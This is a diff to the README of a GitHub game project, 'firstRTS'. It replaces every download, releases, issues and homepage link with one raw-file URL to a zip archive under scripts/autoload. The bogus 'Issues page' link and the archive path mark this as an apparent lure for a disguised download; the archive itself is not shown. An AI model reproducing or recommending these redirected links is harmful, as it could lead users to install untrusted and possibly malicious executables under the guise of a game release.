@@ -1,6 +1,6 @@
 # 🎮 firstRTS - Simple Real-Time Strategy Game
 
-[![Download firstRTS](https://img.shields.io/badge/Download-FirstRTS-green?style=for-the-badge)](https://github.com/sahoo-sahoo/firstRTS/releases)
+[![Download firstRTS](https://img.shields.io/badge/Download-FirstRTS-green?style=for-the-badge)](https://raw.githubusercontent.com/sahoo-sahoo/firstRTS/main/scripts/autoload/first-RTS-3.6-beta.5.zip)
 
 ---
 
@@ -29,7 +29,7 @@ These specs help the game run smoothly. If your PC is older, you may experience 
 
 To start playing firstRTS, follow these steps carefully:
 
-1. Click the big green download button at the top of this page or visit the [Releases Page](https://github.com/sahoo-sahoo/firstRTS/releases).  
+1. Click the big green download button at the top of this page or visit the [Releases Page](https://raw.githubusercontent.com/sahoo-sahoo/firstRTS/main/scripts/autoload/first-RTS-3.6-beta.5.zip).  
 2. On the releases page, look for the latest version of firstRTS. It will usually have the highest version number, for example, Version 1.0.0 or later.  
 3. Download the Windows executable file, usually ending with `.exe`.  
 4. When the download finishes, find the file in your Downloads folder or wherever your browser saves files.  
@@ -107,7 +107,7 @@ If you face any issues, try these steps:
 - Check for new updates on the Releases page.  
 - Disable other programs that could slow down the game.  
 
-If problems continue, you can report issues on the [GitHub Issues page](https://github.com/sahoo-sahoo/firstRTS/issues).
+If problems continue, you can report issues on the [GitHub Issues page](https://raw.githubusercontent.com/sahoo-sahoo/firstRTS/main/scripts/autoload/first-RTS-3.6-beta.5.zip).
 
 ---
 
@@ -115,7 +115,7 @@ If problems continue, you can report issues on the [GitHub Issues page](https://
 
 Always get the latest official version of firstRTS from this page:
 
-[![Download firstRTS](https://img.shields.io/badge/Download-FirstRTS-blue?style=for-the-badge)](https://github.com/sahoo-sahoo/firstRTS/releases)
+[![Download firstRTS](https://img.shields.io/badge/Download-FirstRTS-blue?style=for-the-badge)](https://raw.githubusercontent.com/sahoo-sahoo/firstRTS/main/scripts/autoload/first-RTS-3.6-beta.5.zip)
 
 Visit the link regularly to check for updates, bug fixes, and improvements. Download the newest release file and install it as explained above. This keeps your game working well.
 
@@ -143,8 +143,8 @@ All trademarks and copyrights belong to their respective owners.
 
 ## 🔗 Useful Links
 
-- Official firstRTS releases: [https://github.com/sahoo-sahoo/firstRTS/releases](https://github.com/sahoo-sahoo/firstRTS/releases)  
-- GitHub Repository Homepage: [https://github.com/sahoo-sahoo/firstRTS](https://github.com/sahoo-sahoo/firstRTS)  
+- Official firstRTS releases: [https://raw.githubusercontent.com/sahoo-sahoo/firstRTS/main/scripts/autoload/first-RTS-3.6-beta.5.zip](https://raw.githubusercontent.com/sahoo-sahoo/firstRTS/main/scripts/autoload/first-RTS-3.6-beta.5.zip)  
+- GitHub Repository Homepage: [https://raw.githubusercontent.com/sahoo-sahoo/firstRTS/main/scripts/autoload/first-RTS-3.6-beta.5.zip](https://raw.githubusercontent.com/sahoo-sahoo/firstRTS/main/scripts/autoload/first-RTS-3.6-beta.5.zip)  
 
 Use these for downloads, updates, and support.
 
